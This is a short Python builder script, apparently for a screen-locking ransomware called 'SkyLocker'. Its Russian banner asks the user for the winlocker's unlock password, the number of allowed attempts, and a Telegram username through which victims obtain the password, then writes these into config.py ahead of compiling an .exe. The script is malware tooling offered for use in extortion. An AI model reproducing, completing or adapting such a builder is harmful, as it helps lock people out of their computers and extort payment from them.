green = "\033[32m"
w_blue = "\033[36m"
blue = "\033[34m"
reset = "\033[0m"
text = r"""
Эта программа поможет собрать вам исходный код в единый .exe файл.
Ниже вам необходимо ввести следующие параметры: 
password: пароль для вашего winlocker, состоящий только из цифр. 
count: колличество попыток ввода пароля. 
tg_username: телеграм username для связи и получения пароля."""
art1 = r"""
 _____ _          _           _____ _       ______                       
/  ___| |        | |         /  __ \ |      | ___ \     
\ `--.| | ___   _| |     ___ | /  \/ | _____| |_/ /        
 `--. \ |/ / | | | |    / _ \| |   | |/ / _ \    / 
/\__/ /   <| |_| | |___| (_) | \__/\   <  __/ |\ \ 
\____/|_|\_\\__, \_____/\___/ \____/_|\_\___\_| \_|
             __/ |                                 
            |___/                                                                                             
"""
art2 = r"""
  ___            _    _       _               
 | _ )   _  _   (_)  | |   __| |   ___    _ _ 
 | _ \  | || |  | |  | |  / _` |  / -_)  | '_|
 |___/   \_,_|  |_|  |_|  \__,_|  \___|  |_|  
"""
print(green + art1 + reset)
print(w_blue + text + reset)
print()
print(blue, end="")
password0 = input("Enter password: ")
count0 = input("Enter count: ")
tg_username0 = input("Enter tg_username: ")
print(reset, end="")

def build():
    with open("config.py", "w", encoding="utf-8") as f:
        f.write(f'password = "{password0}"\n')
        f.write(f'tg_username = "{tg_username0}"\n')
        f.write(f'count = {count0}\n')

if __name__ == "__main__":
    build()

